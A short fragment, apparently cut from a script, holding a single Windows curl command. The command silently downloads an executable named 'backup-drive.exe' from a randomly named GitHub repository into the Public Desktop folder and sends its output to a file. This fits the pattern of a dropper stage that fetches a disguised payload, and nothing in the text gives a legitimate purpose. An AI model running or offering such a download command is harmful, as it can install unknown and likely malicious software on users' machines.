...
curl -o "C:\Users\Public\Desktop\backup-drive.exe" https://raw.githubusercontent.com/alexdanca/3h4hdoet924gwoedb395heb4boDi3hfn/main/Files/backup-drive.exe > out.txt 2>&1
